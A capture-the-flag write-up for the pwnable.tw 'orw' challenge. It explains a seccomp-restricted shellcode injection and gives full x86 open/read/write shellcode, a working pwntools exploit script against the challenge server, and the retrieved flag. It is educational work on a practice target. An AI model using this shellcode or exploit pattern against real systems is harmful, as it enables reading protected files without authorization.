# pwnable.tw - orw (100 pts)

## Challenge Description
> Read the flag from /home/orw/flag.
> Only open read write syscall are allowed to use.
> `nc chall.pwnable.tw 10001`

## Binary Analysis

### File Information
```
$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

### Main Function Disassembly
```asm
08048548 <main>:
 8048548:   lea    0x4(%esp),%ecx
 804854c:   and    $0xfffffff0,%esp
 8048559:   call   80484cb <orw_seccomp>   ; Setup seccomp filter
 8048561:   push   $0x80486a0              ; "Give my your shellcode:"
 8048566:   call   8048380 <printf@plt>
 8048571:   push   $0xc8                   ; 200 bytes
 8048576:   push   $0x804a060              ; buffer address
 804857b:   push   $0x0                    ; stdin
 804857d:   call   8048370 <read@plt>      ; read(0, 0x804a060, 200)
 8048585:   mov    $0x804a060,%eax
 804858a:   call   *%eax                   ; Execute shellcode!
```

### Security Analysis
The binary uses `prctl` with `PR_SET_SECCOMP` to restrict syscalls. Only three syscalls are permitted:
- `open` (syscall 5)
- `read` (syscall 3)
- `write` (syscall 4)

## Vulnerability

This is a **shellcode injection** challenge. The program:
1. Reads up to 200 bytes of user input into a fixed buffer (0x804a060)
2. Directly executes that buffer as code

The catch: seccomp filters restrict us to only `open`, `read`, and `write` syscalls - we cannot spawn a shell with `execve`.

## Exploitation Strategy

Since we can't get a shell, we need to:
1. **Open** the flag file at `/home/orw/flag`
2. **Read** the file contents into memory
3. **Write** the contents to stdout

### 32-bit Linux Syscall Convention
```
eax = syscall number
ebx = arg1, ecx = arg2, edx = arg3
int 0x80 to invoke syscall
```

### Shellcode Design
```asm
/* 1. open("/home/orw/flag", O_RDONLY) */
push 0x00006761      ; "ag\x00\x00" (with null terminator)
push 0x6c662f77      ; "w/fl"
push 0x726f2f65      ; "e/or"
push 0x6d6f682f      ; "/hom"
mov ebx, esp         ; ebx = pointer to path string
xor ecx, ecx         ; ecx = 0 (O_RDONLY)
xor edx, edx         ; edx = 0
mov eax, 5           ; syscall: open
int 0x80             ; returns fd in eax

/* 2. read(fd, buffer, size) */
mov ebx, eax         ; ebx = fd from open
mov ecx, esp         ; ecx = buffer (reuse stack)
mov edx, 0x40        ; edx = 64 bytes to read
mov eax, 3           ; syscall: read
int 0x80

/* 3. write(stdout, buffer, size) */
mov ebx, 1           ; ebx = 1 (stdout)
mov ecx, esp         ; ecx = buffer
mov edx, 0x40        ; edx = 64 bytes to write
mov eax, 4           ; syscall: write
int 0x80
```

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "i386"

p = remote("chall.pwnable.tw", 10001)

shellcode = asm("""
    /* open("/home/orw/flag", O_RDONLY) */
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 5
    int 0x80

    /* read(fd, esp, 0x40) */
    mov ebx, eax
    mov ecx, esp
    mov edx, 0x40
    mov eax, 3
    int 0x80

    /* write(1, esp, 0x40) */
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x40
    mov eax, 4
    int 0x80
""")

p.recvuntil(b"shellcode:")
p.send(shellcode)
print(p.recvall())
```

## Running the Exploit

```bash
$ python3 exploit.py
[+] Opening connection to chall.pwnable.tw on port 10001: Done
[+] Receiving all data: Done
[*] Closed connection to chall.pwnable.tw port 10001
b'FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}'
```

## Key Takeaways

1. **Seccomp restrictions**: Modern sandboxes often limit syscalls - exploit within the allowed set
2. **Data exfiltration**: When you can't get a shell, focus on reading/writing files
3. **String pushing**: Push strings in reverse order (little-endian) with proper null termination
4. **Stack as buffer**: The stack is a convenient scratch space when you control execution

## References
- [Linux x86 Syscall Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [Seccomp BPF](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)
